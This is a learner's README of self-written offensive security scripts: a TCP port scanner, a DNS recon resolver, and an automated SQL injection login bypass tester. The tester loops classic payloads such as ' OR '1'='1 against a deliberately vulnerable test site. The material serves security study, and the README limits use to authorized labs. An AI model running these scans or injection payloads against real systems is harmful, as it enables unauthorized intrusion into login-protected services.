# 🛠️ Security Scripts

Personal collection of offensive security scripts built from scratch.
Built using the build-before-tools learning method — understand the 
primitive before using the industry tool.

---

## 📁 Scripts

### 1. tcp_scanner.py
**What it does:** Scans a target IP for open TCP ports using raw sockets.  
**Concept:** TCP three-way handshake — if connect_ex() returns 0, port is open.  
**Industry tool equivalent:** Nmap  
**Key learning:** Single-threaded scanner misses nothing but is slow. 
Threading (withthreads.py) runs 100 checks in parallel.

**Usage:**
```import socket

target = "192.168.0.104"
ports = [21,22,23,80,443,3306,8080]

print(f"Scanning {target}...")
for port in ports:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex((target, port))
    if result == 0:
        print(f"[OPEN] Port {port}")
    else:
        print(f"[DOWN] Port {port}")
    sock.close()  
```
This script onnly scans the ports that are given 
To scan all ports we need to use threading that scans 100 ports at a time

### 2. dns_resolver.py
**What it does:** Takes a domain name as input and resolves it to an IP address.  
**Concept:** DNS resolution — every domain maps to an IP. 
`gethostbyname()` queries the DNS chain to find it.  
**Industry tool equivalent:** `nslookup`, `dig`, `host`  
**Key learning:** Before you scan or attack anything, you need the IP. 
This is always step 1 in active recon.

**Usage:**
```
import socket

target = input("Enter Your Domain : ")
print(f"Recon Started For {target}")

try:
    ip = socket.gethostbyname(target)
    print(f"Domain: {target}")
    print(f"IP: {ip}")
except socket.gaierror:
    print(f"Could not resolve {target} — domain may not exist")
```

**Sample output:**
```
Recon Started For google.com
Domain: google.com
IP: 142.250.77.46
```

**Bug bounty use case:** Resolve all subdomains from your subdomain 
enumeration list to IPs. Any subdomain that resolves = live target worth 
investigating further.

Automated SQLi Auth Bypass Tester (sqli_tester.py)
📝 Description
This is a lightweight Python automation script designed to test web login forms for SQL Injection (SQLi) Authentication Bypass vulnerabilities. Instead of manually testing inputs via a browser, this tool utilizes the requests library to loop through a checklist of malicious payloads, submit them to a target backend form, and analyze the response to flag successful bypasses.

🛠️ Core Concepts Covered
Automated HTTP Requests: Uses requests.post() to simulate a user physically clicking "Log In" on a web form.

Parameter Mapping: Binds malicious injection payloads directly to the backend form data elements (uname, pass, submit).

Exception Handling: Implements a try/except block to catch connection drops or server timeouts without crashing the terminal.

Response Analysis: Evaluates the server's HTML response (response.text) to dynamically identify if a login restriction was bypassed or if the database threw a syntax error.


**Usage:**
```
import requests

# 1. Target URL
target_url = "http://testphp.vulnweb.com/userinfo.php"

# 2. Our list of malicious SQL inputs (Payloads)
payloads = ["' OR 1=1 -- -", "admin' --", "' OR '1'='1"]

print("[*] Starting our automated login tester...")

# 3. Loop through each payload automatically
for payload in payloads:
    
    # Corrected form data matching the exact live site parameters
    form_data = {
        'uname': payload,
        'pass': 'Password123',
        'submit': 'login'  # We added the missing login button click!
    }
    
    try:
        # 4. Send the data to the website
        response = requests.post(target_url, data=form_data)
        
        # 5. Check if the webpage contains a login failure message
        if "wrong username or password" in response.text.lower():
            print(f"[-] Payload failed: {payload}")
        else:
            print(f"[+] SUCCESS! Potential bypass found with payload: {payload}")
            
    except Exception as e:
        print(f"[!] Connection error occurred: {e}")
```

Expected Output:
[*] Starting our automated login tester...
[-] Payload failed: ' OR 1=1 -- -
[-] Payload failed: admin' --
[+] SUCCESS! Potential bypass found with payload: ' OR '1'='1

⚠️ Disclaimer
This script is created exclusively for educational purposes and authorized penetration testing within laboratory environments (such as testphp.vulnweb.com). Unauthorized scanning of production infrastructure without prior written consent is strictly illegal.
